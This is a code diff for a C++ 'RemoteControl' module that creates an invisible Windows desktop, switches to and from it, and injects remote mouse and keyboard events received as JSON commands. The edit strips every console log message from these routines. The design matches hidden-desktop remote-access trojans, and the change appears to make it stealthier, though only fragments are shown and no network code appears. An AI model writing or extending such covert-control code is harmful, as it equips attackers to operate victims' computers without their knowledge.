@@ -1,4 +1,4 @@
-#include "RemoteControl.h"
+﻿#include "RemoteControl.h"
 
 RemoteDesktop* g_RemoteDesktop = nullptr;
 
@@ -15,7 +15,6 @@ RemoteDesktop::~RemoteDesktop() {
 
 bool RemoteDesktop::CreateHiddenDesktop() {
     if (m_hHiddenDesktop) {
-        std::cout << "[RemoteControl] Hidden desktop already exists" << std::endl;
         return true;
     }
     
@@ -32,11 +31,8 @@ bool RemoteDesktop::CreateHiddenDesktop() {
     );
     
     if (!m_hHiddenDesktop) {
-        std::cout << "[RemoteControl] Failed to create hidden desktop: " << GetLastError() << std::endl;
         return false;
     }
-    
-    std::cout << "[RemoteControl] Hidden desktop created successfully" << std::endl;
     return true;
 }
 
@@ -48,36 +44,29 @@ bool RemoteDesktop::SwitchToHiddenDesktop() {
     }
     
     if (!SetThreadDesktop(m_hHiddenDesktop)) {
-        std::cout << "[RemoteControl] Failed to switch to hidden desktop: " << GetLastError() << std::endl;
         return false;
     }
     
     if (!SwitchDesktop(m_hHiddenDesktop)) {
-        std::cout << "[RemoteControl] Failed to switch desktop display: " << GetLastError() << std::endl;
     }
     
     m_isUsingHiddenDesktop = true;
-    std::cout << "[RemoteControl] Switched to hidden desktop" << std::endl;
     return true;
 }
 
 bool RemoteDesktop::SwitchToOriginalDesktop() {
     if (!m_hOriginalDesktop) {
-        std::cout << "[RemoteControl] Original desktop not available" << std::endl;
         return false;
     }
     
     if (!SetThreadDesktop(m_hOriginalDesktop)) {
-        std::cout << "[RemoteControl] Failed to switch to original desktop: " << GetLastError() << std::endl;
         return false;
     }
     
     if (!SwitchDesktop(m_hOriginalDesktop)) {
-        std::cout << "[RemoteControl] Failed to switch desktop display: " << GetLastError() << std::endl;
     }
     
     m_isUsingHiddenDesktop = false;
-    std::cout << "[RemoteControl] Switched to original desktop" << std::endl;
     return true;
 }
 
@@ -89,7 +78,6 @@ void RemoteDesktop::Cleanup() {
     if (m_hHiddenDesktop) {
         CloseDesktop(m_hHiddenDesktop);
         m_hHiddenDesktop = nullptr;
-        std::cout << "[RemoteControl] Hidden desktop cleaned up" << std::endl;
     }
 }
 
@@ -221,7 +209,6 @@ void HandleMouseEvent(const json& data) {
         }
     }
     catch (...) {
-        std::cout << "[RemoteControl] Error handling mouse event" << std::endl;
     }
 }
 
@@ -288,7 +275,6 @@ void HandleKeyboardEvent(const json& data) {
         }
     }
     catch (...) {
-        std::cout << "[RemoteControl] Error handling keyboard event" << std::endl;
     }
 }
 
@@ -300,13 +286,11 @@ void HandleRemoteControl(const std::string& action, const json& data) {
         }
         
         if (g_RemoteDesktop->SwitchToHiddenDesktop()) {
-            std::cout << "[RemoteControl] Hidden desktop enabled" << std::endl;
         }
     }
     else if (action == "DISABLE_HIDDEN_DESKTOP") {
         if (g_RemoteDesktop) {
             g_RemoteDesktop->SwitchToOriginalDesktop();
-            std::cout << "[RemoteControl] Hidden desktop disabled" << std::endl;
         }
     }
     else if (action == "MOUSE_EVENT") {
